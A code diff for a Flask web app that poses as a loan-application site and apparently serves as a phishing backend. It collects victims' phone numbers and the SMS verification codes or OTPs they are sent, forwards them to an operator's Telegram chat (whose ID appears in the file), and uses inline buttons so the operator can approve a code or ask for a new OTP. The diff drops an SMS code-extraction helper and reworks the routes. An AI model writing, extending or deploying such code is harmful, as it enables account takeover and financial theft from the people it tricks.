@@ -1,6 +1,5 @@
 from flask import Flask, render_template, request, jsonify
 import requests
-import re
 import json
 from datetime import datetime
 import os
@@ -17,24 +16,7 @@ TELEGRAM_CHAT_ID = '8589275340'
 applications = {}
 
 # ==================== HELPERS ====================
-def extract_code_from_sms(sms_text):
-    """Extract the verification code from the full SMS"""
-    if not sms_text:
-        return None
-    patterns = [
-        r'code[:\s]+([a-zA-Z0-9]{6,20})',
-        r'OTP[:\s]+([a-zA-Z0-9]{6,20})',
-        r'use the code[:\s]+([a-zA-Z0-9]{6,20})',
-        r'\b([a-zA-Z0-9]{8,20})\b'
-    ]
-    for pattern in patterns:
-        match = re.search(pattern, sms_text, re.IGNORECASE)
-        if match:
-            return match.group(1)
-    return None
-
 def send_telegram_message(message, buttons=None):
-    """Send message to Telegram with optional inline buttons"""
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {
         'chat_id': TELEGRAM_CHAT_ID,
@@ -59,17 +41,9 @@ def index():
 def apply():
     return render_template('apply.html')
 
-@app.route('/login')
-def login():
-    return render_template('login.html')
-
-@app.route('/verify')
-def verify():
-    return render_template('verify.html')
-
-@app.route('/result')
-def result():
-    return render_template('result.html')
+@app.route('/approve')
+def approve():
+    return render_template('approve.html')
 
 # ==================== API ROUTES ====================
 @app.route('/api/submit_loan', methods=['POST'])
@@ -120,10 +94,7 @@ def submit_loan():
         
         send_telegram_message(message, buttons)
         
-        return jsonify({
-            'status': 'success',
-            'app_id': app_id
-        })
+        return jsonify({'status': 'success', 'app_id': app_id})
         
     except Exception as e:
         print(f"Error in submit_loan: {e}")
@@ -146,15 +117,13 @@ def submit_code():
     try:
         data = request.get_json()
         app_id = data.get('app_id')
-        full_sms = data.get('code')
+        code = data.get('code')
         
         if app_id not in applications:
             return jsonify({'status': 'error', 'message': 'Application not found'}), 404
         
-        applications[app_id]['sms_code'] = full_sms
+        applications[app_id]['sms_code'] = code
         applications[app_id]['code_status'] = 'waiting'
-        
-        extracted_code = extract_code_from_sms(full_sms)
         
         message = f"""
 🔐 <b>CODE VERIFICATION</b>
@@ -163,9 +132,7 @@ def submit_code():
 📱 <b>Phone:</b> +255{applications[app_id].get('phone', '')}
 
 <b>📱 Full SMS:</b>
-<code>{full_sms}</code>
-
-<b>🔑 Extracted Code:</b> <code>{extracted_code or 'Not found'}</code>
+<code>{code}</code>
 
 <b>📅 Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
@@ -220,19 +187,16 @@ New OTP has been requested. Please wait for SMS.
     except Exception as e:
         return jsonify({'status': 'error'}), 500
 
-# ==================== WEBHOOK ====================
 @app.route('/webhook', methods=['POST'])
 def webhook():
     try:
         data = request.get_json()
         
-        # Handle callback queries (button clicks)
         if 'callback_query' in data:
             callback_data = data['callback_query']
             callback_id = callback_data['id']
             action = callback_data['data']
             
-            # Parse action and app_id
             parts = action.split('_')
             if len(parts) >= 2:
                 action_type = '_'.join(parts[:-1])
@@ -241,15 +205,9 @@ def webhook():
                 action_type = action
                 app_id = ''
             
-            # Answer the callback (required by Telegram)
             answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
-            requests.post(answer_url, json={
-                'callback_query_id': callback_id,
-                'text': '✅ Done',
-                'show_alert': False
-            })
+            requests.post(answer_url, json={'callback_query_id': callback_id, 'text': 'Done'})
             
-            # Update application status based on action
             if app_id in applications:
                 if action_type == 'approve_loan':
                     applications[app_id]['code_status'] = 'approved'
@@ -269,22 +227,15 @@ def webhook():
             else:
                 response = f"App {app_id} not found"
             
-            # Send confirmation message
             send_telegram_message(response)
             return jsonify({'status': 'success'})
-        
-        # Handle regular messages (optional)
-        elif 'message' in data:
-            return jsonify({'status': 'ok'})
-        
-        # Default response for other updates
+            
         return jsonify({'status': 'ok'})
         
     except Exception as e:
         print(f"Webhook error: {e}")
         return jsonify({'status': 'error'}), 500
 
-# ==================== MAIN ====================
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=True)
